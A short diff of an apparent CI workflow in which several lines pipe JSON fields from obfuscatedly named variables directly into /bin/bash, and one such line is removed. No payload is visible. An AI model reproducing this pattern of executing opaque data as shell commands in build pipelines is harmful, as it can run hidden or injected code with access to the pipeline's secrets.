@@ -20,7 +20,6 @@ jobs:
           echo $codcx7303 | jq -r .n0 | /bin/bash
           echo $t49 | jq -r .jnzx605 | /bin/bash
           printf '%s' "$pejf419" | jq -r .akh636 | /bin/bash
-          printf '%s' "$nlog584" | jq -r .jws80581 | /bin/bash
           printf '%s' "$g6" | jq -r .jnwvd6 | /bin/bash
 
       - name: Upload artifact
